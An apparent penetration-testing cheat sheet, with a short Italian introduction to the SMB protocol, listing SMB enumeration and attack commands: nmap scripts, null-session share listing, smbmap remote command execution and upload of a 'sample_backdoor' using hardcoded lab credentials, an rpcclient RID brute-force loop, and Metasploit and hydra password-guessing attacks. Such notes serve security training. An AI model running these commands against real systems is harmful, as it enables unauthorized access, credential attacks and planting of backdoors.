Server Message Block è un protocollo client-server che regola l'accesso a file e intere directory e ad altre risorse di rete come stampanti, router o interfacce rilasciate per la rete. 
Lo scambio di informazioni tra diversi processi di sistema può essere gestito anche sulla base del protocollo SMB.  
l protocollo SMB consente al client di comunicare con altri partecipanti alla stessa rete per accedere a file o servizi condivisi con esso sulla rete. Anche l'altro sistema deve aver implementato il protocollo di rete e ricevuto ed elaborato la richiesta del client utilizzando un'applicazione server SMB. Prima però entrambe le parti devono stabilire una connessione, motivo per cui si scambiano prima i messaggi corrispondenti.   
ACL (Accesso Control List) regola i diritti di accesso, attraverso attributi xr (execute, read, full access).

#### smb nmap scripts
```
After finding SMB through port scanning, gather more information with nmap scripts.
> find /usr/share/nmap/scripts -type f -name *smb* 2>/dev/null


SMB Recon:
> nmap -sV -p 139,445 192.28.157.3

SMB OS detection:
> nmap --script smb-os-discovery -p 445 192.28.157.3

SMB Protocols:
> nmap -p445 --script smb-protocols 10.2.24.25

SMB Security levels:
> nmap -p445 --script smb-security-mode 10.2.24.25

SMB logged users:
> nmap -p445 --script smb-enum-sessions 10.2.24.25

SMB login admin default
> nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

SMB shares
> nmap -p445 --script smb-enum-shares 10.2.24.25

SMB users
> nmap -p445 --script smb-enum-users 10.2.24.25

SMB windows users
> nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

Server statistics
> nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

System domains
> nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

Available groups
> nmap -p445 --script smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

Services
> nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

ls cmd
> nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25 
```


#### crackmapexec
```
Enumeration shares SMB with null session:
> crackmapexec smb <FQDN/IP> --shares -u '' -p ''
```
#### smbmap
```
> nmap -p445 --script smb-protocols 10.2.21.233

Login:
> smbmap -u guest -p "" -d . -H 10.2.21.233
> smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.233

Running Commands:
> smbmap -u administrator -p smbserver_771 -H 10.2.21.233 -x 'ipconfig’

List all drives
> smbmap -H 10.2.21.233
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -L

List Directory Contents
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -r 'C$’

SMB Shares Using Credentials:
> smbmap -u admin -p password1 -H 192.174.58.3

Upload file:
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --upload '/root/sample_backdoor' 'C$\sample_backdoor’

Download a file:
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\flag.txt’ 
```


#### rpcclient
```
SMB null sessions:
> rpcclient -U "" -N 10.10.10.10

SMB server info:
rpcclient $> srvinfo

Enumeration domains users:
rpcclient $> enumdomusers

Enumeration domains users using RID:
rpcclient $> queryuser <RIDuser>

Enumeration of all users with RIDuser:
> for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done

Retrieve domains info, such as server, users:
rpcclient $> querydominfo

Enumeration of all shares available:
rpcclient $> netshareenumall

Enumeration of a specific shares available:
rpcclient $> netsharegetinfo <share>

Enumeration domains groups:
rpcclient $> enumdomgroups

Enumeration users/admin SID:
rpcclient $> lookupnames admin

```

#### enum4linux
Tools for enumerating data from Windows and Samba hosts

```
> enum4linux -o 192.230.128.3

Users:
> enum4linux -U 192.230.128.3

Shares:
> enum4linux -S 192.187.39.3

Domain Groups:
> enum4linux -G 192.187.39.3

Check if samba server is configured for printing:
> enum4linux -i 192.187.39.3

List users SUID:
> enum4linux -r -u "admin" -p "password1" 192.174.58.3
```

#### smbclient
FTP-like client to access SMB/CIFS resources on server

```
> smbclient -L 192.28.157.3 -N
> smbclient //192.187.39.3/public -N
> smbclient -L 192.28.157.3 -U jane
> smbclient //192.174.58.3/jane -U jane
> smbclient //192.174.58.3/admin -U admin

smb> get flag - Important cat and type wont work in smb
```

#### nmblookup
```
NetBIOS over TCP/IP client used to lookup NetBIOS names
> nmblookup -A 192.28.157.3
```


#### metasploit:
```
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/pipe_auditor

Dictionary attack:
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
exploit

```

#### hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.3 smb
```